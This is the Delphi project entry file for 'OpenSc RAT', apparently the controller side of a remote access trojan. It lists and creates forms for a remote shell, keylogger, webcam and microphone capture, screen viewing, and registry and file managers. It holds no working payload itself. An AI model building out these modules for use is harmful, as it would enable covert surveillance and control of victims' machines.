program OpenSc_RAT;
       
{
  OpenSc RAT v0.1 - Server part (https://www.OpenSc.ws)

  Last modification: 04/11/2017 by wrh1d3 [wrh1d3@gmail.com / wrh1d3@xmpp.jp]
}

uses
  Forms,
  UnitMain in 'UnitMain.pas' {FormMain},
  UnitFilesManager in 'UnitFilesManager.pas' {FormFilesManager},
  UnitRegistryManager in 'UnitRegistryManager.pas' {FormRegistryManager},
  UnitTasksManager in 'UnitTasksManager.pas' {FormTasksManager},
  UnitShell in 'UnitShell.pas' {FormShell},
  UnitScreen in 'UnitScreen.pas' {FormScreen},
  UnitWebcam in 'UnitWebcam.pas' {FormWebcam},
  UnitMicrophone in 'UnitMicrophone.pas' {FormMicrophone},
  UnitKeylogger in 'UnitKeylogger.pas' {FormKeylogger},
  UnitChat in 'UnitChat.pas' {FormChat},
  UnitMiscellaneous in 'UnitMiscellaneous.pas' {FormMiscellaneous},
  UnitFilesTransfers in 'UnitFilesTransfers.pas' {FormFilesTransfers},
  UnitConfiguration in '..\Units\UnitConfiguration.pas',
  SocketUnitEx in '..\Units\SocketUnitEx.pas',
  uCryptoGear in '..\Units\uCryptoGear.pas',
  ZLibEx in '..\Units\ZLibEx\ZLibEx.pas',
  ACMConvertor in '..\Units\ACM\ACMConvertor.pas',
  ACMIn in '..\Units\ACM\ACMIn.pas',
  ACMOut in '..\Units\ACM\ACMOut.pas',
  ListUnit in '..\Units\ACM\ListUnit.pas',
  MSAcm in '..\Units\ACM\MSACM.pas',
  uJSONConfig in 'uJSONConfig\uJSONConfig.pas',
  uLkJSON in 'uJSONConfig\uLkJSON.pas',
  GeoIP in 'GeoIP.pas',
  UnitCountry in 'UnitCountry.pas',
  UnitGeoIP in 'UnitGeoIP.pas',
  UnitConnection in 'UnitConnection.pas',
  UnitEncryption in '..\Units\UnitEncryption.pas',
  UnitCommands in '..\Units\UnitCommands.pas',
  UnitUtils in '..\Units\UnitUtils.pas';

{$R *.res}

begin
  Application.Initialize;
  Application.Title := 'OpenSc RAT';
  Application.CreateForm(TFormMain, FormMain);
  Application.CreateForm(TFormFilesManager, FormFilesManager);
  Application.CreateForm(TFormRegistryManager, FormRegistryManager);
  Application.CreateForm(TFormTasksManager, FormTasksManager);
  Application.CreateForm(TFormShell, FormShell);
  Application.CreateForm(TFormScreen, FormScreen);
  Application.CreateForm(TFormWebcam, FormWebcam);
  Application.CreateForm(TFormMicrophone, FormMicrophone);
  Application.CreateForm(TFormKeylogger, FormKeylogger);
  Application.CreateForm(TFormChat, FormChat);
  Application.CreateForm(TFormMiscellaneous, FormMiscellaneous);
  Application.CreateForm(TFormFilesTransfers, FormFilesTransfers);
  Application.Run;
end.
